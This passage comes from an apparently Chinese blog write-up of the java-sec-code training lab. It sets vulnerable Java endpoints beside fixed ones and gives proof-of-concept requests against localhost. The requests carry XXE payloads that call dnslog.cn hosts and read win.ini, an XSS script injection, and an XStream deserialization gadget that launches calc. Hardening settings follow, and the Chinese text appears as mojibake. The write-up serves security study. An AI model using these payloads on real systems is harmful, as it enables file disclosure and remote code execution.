XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>150<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://f89q97.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944246.png" alt="20250727123019413"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080945207.png" alt="20250727123025939"></p><h3 id="6-SAXReader-sec"><a href="#6-SAXReader-sec" class="headerlink" title="6.&#x2F;SAXReader&#x2F;sec"></a>6.&#x2F;SAXReader&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXReader/sec&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXReaderSec</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXReader</span>();<br>        reader.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>        reader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        reader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">// org.dom4j.Document document</span><br>        reader.read(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXReader xxe security code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="7-SAXParser-vuln"><a href="#7-SAXParser-vuln" class="headerlink" title="7.&#x2F;SAXParser&#x2F;vuln"></a>7.&#x2F;SAXParser&#x2F;vuln</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXParser/vuln&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXParserVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXParserFactory</span> <span class="hljs-variable">spf</span> <span class="hljs-operator">=</span> SAXParserFactory.newInstance();<br>        <span class="hljs-type">SAXParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> spf.newSAXParser();<br>        parser.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)), <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultHandler</span>());  <span class="hljs-comment">// parse xml</span><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXParser xxe vuln code&quot;</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/SAXParser/vuln</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>152<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://h1bdeh.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080945564.png" alt="20250727123517394"></p><h3 id="8-SAXParser-sec"><a href="#8-SAXParser-sec" class="headerlink" title="8.&#x2F;SAXParser&#x2F;sec"></a>8.&#x2F;SAXParser&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXParser/sec&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXParserSec</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXParserFactory</span> <span class="hljs-variable">spf</span> <span class="hljs-operator">=</span> SAXParserFactory.newInstance();<br>        spf.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>        spf.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        spf.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-type">SAXParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> spf.newSAXParser();<br>        parser.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)), <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultHandler</span>());  <span class="hljs-comment">// parse xml</span><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXParser xxe security code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="9-è¿™äº›æ–¹æ³•çš„åˆ©ç”¨å’Œä¿®å¤éƒ½æ˜¯ä¸€æ ·çš„ã€‚"><a href="#9-è¿™äº›æ–¹æ³•çš„åˆ©ç”¨å’Œä¿®å¤éƒ½æ˜¯ä¸€æ ·çš„ã€‚" class="headerlink" title="9.è¿™äº›æ–¹æ³•çš„åˆ©ç”¨å’Œä¿®å¤éƒ½æ˜¯ä¸€æ ·çš„ã€‚"></a>9.è¿™äº›æ–¹æ³•çš„åˆ©ç”¨å’Œä¿®å¤éƒ½æ˜¯ä¸€æ ·çš„ã€‚</h3><p>POCæ„é€ ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /xxe/***/*** HTTP/1.1<br>Host: 127.0.0.1:8081<br>Content-Type: application/xml<br>Content-Length: 198  å¯ä»¥ä¸å†™<br>Connection: close<br>        æ­¤å¤„ç©ºä¸€è¡Œ åˆ†éš” Header ä¸ Body <br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [  </span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span>  </span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br>æˆ–<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://1izyf3.dnslog.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¿®å¤ï¼š</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">xmlReader.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>xmlReader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>xmlReader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/reflect&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">reflect</span><span class="hljs-params">(String xss)</span> &#123;<br>    <span class="hljs-keyword">return</span> xss;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://127.0.0.1:8081/xss/reflect?xss=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080946271.png" alt="20250727110941871"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å…ˆå°† xss å‚¨å­˜åœ¨ cookie ä¸­ï¼Œ</span><br><span class="hljs-meta">@RequestMapping(&quot;/stored/store&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">store</span><span class="hljs-params">(String xss, HttpServletResponse response)</span> &#123;<br>    <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;xss&quot;</span>, xss);<br>    response.addCookie(cookie);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Set param into cookie&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">//è®¿é—® /stored/show çœ‹åˆ°xss</span><br> <span class="hljs-meta">@RequestMapping(&quot;/stored/show&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">show</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(&quot;xss&quot;)</span> String xss)</span> &#123;<br>        <span class="hljs-keyword">return</span> xss;<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/xss/</span>stored<span class="hljs-regexp">/store?xss=&lt;script&gt;alert(1)&lt;/</span>script&gt;<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/xss/</span>stored/show<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080946560.png" alt="20250727111445251"></p><p><img src="https://gitee.com/xvshifu/pic-go/raw/master/img/20250727111506996.png" alt="image-20250727111506881"></p><h2 id="XStreamRce"><a href="#XStreamRce" class="headerlink" title="XStreamRce"></a>XStreamRce</h2><blockquote><p>XStreamæ˜¯Javaç±»åº“ï¼Œç”¨æ¥å°†å¯¹è±¡åºåˆ—åŒ–æˆXML ï¼ˆJSONï¼‰æˆ–ååºåˆ—åŒ–ä¸ºå¯¹è±¡ã€‚</p><p><strong>ä¹Ÿå°±æ˜¯è¯´ï¼Œä½¿ç”¨XStreamï¼Œæˆ‘ä»¬å¯ä»¥æŠŠJavaå¯¹è±¡è½¬æ¢æˆXMLï¼Œä¹Ÿå¯ä»¥å°†XMLè½¬æ¢ä¸ºJavaå¯¹è±¡ã€‚</strong></p><p>æœ‰RCEæ¼æ´å—å½±å“ç‰ˆæœ¬ï¼š<br>Xstream affected version: 1.4.10 or &lt;&#x3D; 1.4.6</p><p>CVE-2020-26217 | XStreamè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ </p><p><a href="https://www.cnblogs.com/303donatello/p/13998245.html">https://www.cnblogs.com/303donatello/p/13998245.html</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080947532.png" alt="20250727124508575"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@PostMapping(&quot;/xstream&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">parseXml</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">xml</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>    <span class="hljs-type">XStream</span> <span class="hljs-variable">xstream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DomDriver</span>());<br>    xstream.addPermission(AnyTypePermission.ANY); <span class="hljs-comment">// This will cause all XStream versions to be affected.</span><br>    xstream.fromXML(xml);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xstream&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xstream</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=629E8EB9997DA26781472C6FFCAF7454; XSRF-TOKEN=f6390ed7-0e1c-4fbe-a342-1177716a0983; remember-me=YWRtaW46MTc1NDgwMTUzMDEzMTowZDM3ZjcxZDFmODc2YmUyNDQ0NGY3MmZkYTFkY2NmMQ<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>439<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">sorted-set</span>&gt;</span>  </span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">dynamic-proxy</span>&gt;</span> <span class="hljs-comment">&lt;!-- --&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">interface</span>&gt;</span>java.lang.Comparable<span class="hljs-tag">&lt;/<span class="hljs-name">interface</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">handler</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>cmd<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">handler</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">dynamic-proxy</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">sorted-set</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080947651.png" alt="20250727132402482"></p><h1 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h1><p>javaç»å…¸ååºåˆ—åŒ–æ¼æ´å¤ç°</p><p><a href="https://www.cnblogs.com/0kooo-yz/p/18399516">https://www.cnblogs.com/0kooo-yz/p/18399516</a></p><p>ä»£ç å®¡è®¡å…¥é—¨ä¹‹java-sec-codeï¼ˆä¸€ï¼‰</p><p><a href="https://www.freebuf.com/articles/web/289863.html">https://www.freebuf.com/articles/web/289863.html</a></p><p>Java-Secä»£ç å®¡è®¡æ¼æ´ç¯‡(ä¸€)</p><p><a href="https://xz.aliyun.com/news/15669">https://xz.aliyun.com/news/15669</a></p><p>Java-Secä»£ç å®¡è®¡æ¼æ´ç¯‡(äºŒ)</p><p><a href="https://xz.aliyun.com/news/15721">https://xz.aliyun.com/news/15721</a></p><p>Java-sec-codeé¶åœºåˆ†æç»ƒä¹ </p><p><a href="https://buaq.net/go-307106.html">https://buaq.net/go-307106.html</a></p><p>java-sec-code é¶åœºå¤ç°</p><p><a href="https://odiws.github.io/2025/07/08/java-sec-code%E5%A4%8D%E7%8E%B0/">https://odiws.github.io/2025/07/08/java-sec-code%E5%A4%8D%E7%8E%B0/</a></p><p>SnakeYamlååºåˆ—åŒ–æ¼æ´ç ”ç©¶</p><p><a href="https://www.cnblogs.com/LittleHann/p/17828948.html">https://www.cnblogs.com/LittleHann/p/17828948.html</a></p><p>è·¨åŸŸèµ„æºå…±äº« CORS è¯¦è§£</p><p><a 